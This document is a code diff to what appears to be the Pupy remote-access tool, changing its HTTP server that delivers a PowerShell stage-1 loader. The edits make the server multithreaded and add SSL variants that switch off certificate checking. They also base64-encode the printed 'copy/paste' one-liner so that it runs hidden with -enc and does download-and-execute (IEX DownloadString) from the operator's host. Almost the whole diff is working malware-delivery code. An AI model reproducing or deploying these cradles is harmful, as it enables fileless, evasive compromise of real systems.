@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: UTF8 -*-
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+from SocketServer import ThreadingMixIn
 import os.path
 from pupylib.utils.term import colorize
 import random, string
@@ -91,18 +92,16 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.end_headers()
             if self.server.useTargetProxy == True:
                 print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
-                launcher = """IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');""".format(  
-                                                                                server=self.server.link_ip,
-                                                                                port=self.server.link_port,
-                                                                                url_random_two=url_random_two
-                                                                            )
+                if not self.ssl:
+                    launcher = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                else:
+                    launcher = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
             else:
                 print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
-                launcher = """$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString('http://{server}:{port}/{url_random_two}'));""".format(  
-                                                                                server=self.server.link_ip,
-                                                                                port=self.server.link_port,
-                                                                                url_random_two=url_random_two
-                                                                            )
+                if not self.ssl:
+                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                else:
+                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
             launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
             self.wfile.write(launcher)
             print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
@@ -121,16 +120,15 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
             return
-
-class ps1_HTTPServer(HTTPServer):
-    def __init__(self, server_address, conf, link_ip, link_port, ssl, useTargetProxy):
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    def set(self,conf, link_ip, port, ssl, useTargetProxy):
         self.payload_conf = conf
         self.link_ip=link_ip
         self.link_port=link_port
         self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
         self.useTargetProxy = useTargetProxy
-        HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)
         if ssl:
+            self.ssl=ssl
             config = configparser.ConfigParser()
             config.read("pupy.conf")
             keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
@@ -140,7 +138,8 @@ class ps1_HTTPServer(HTTPServer):
 def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=False, useTargetProxy=True):
     try:
         try:
-            server = ps1_HTTPServer((ip, port), conf, link_ip, port, ssl, useTargetProxy)
+            server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
+            server.set(conf, link_ip, port, ssl, useTargetProxy)
         except Exception as e:
             # [Errno 98] Adress already in use
             raise
@@ -148,10 +147,22 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Fa
         print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
         print " --- "
         if useTargetProxy == True:
-            oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')\""%(link_ip, port, url_random_one), "green")
+            if not ssl:
+                a="iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
+                b=b64encode(a.encode('UTF-16LE'))
+            else:
+                a="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
+                b=b64encode(a.encode('UTF-16LE'))
+            oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message=colorize("Please note that if the target's system uses a proxy, this previous powershell command will download/execute pupy through the proxy", "yellow")
         else:
-            oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString('http://%s:%s/%s'));\""%(link_ip, port, url_random_one), "green")
+            if not ssl:
+                a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
+                b=b64encode(a.encode('UTF-16LE'))
+            else:
+                a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
+                b=b64encode(a.encode('UTF-16LE'))
+            oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
         print oneliner
         print " --- "
